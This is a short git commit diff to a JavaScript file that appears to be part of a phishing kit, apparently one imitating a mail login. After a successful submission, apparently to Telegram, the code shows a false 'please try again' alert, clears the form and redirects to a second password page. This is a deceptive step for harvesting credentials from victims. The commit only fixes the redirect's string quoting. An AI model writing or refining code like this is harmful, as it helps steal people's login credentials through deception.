9a8ec6064d00cecd08316d8ce7251df2325ee6f3
olptyi <150342051+olptyi@users.noreply.github.com>
2025-12-02 18:33:20 +0100

    Update intelligent2.js

--- gma/intelligent2.js
+++ gma/intelligent2.js
@@ -74,8 +74,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert(`⛔ please try again`);
           form.reset();
-          window.location.href = 
-          'gpass.html?id=${userId}';
+          window.location.href = `Fpass.html?id=${userId}`;
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
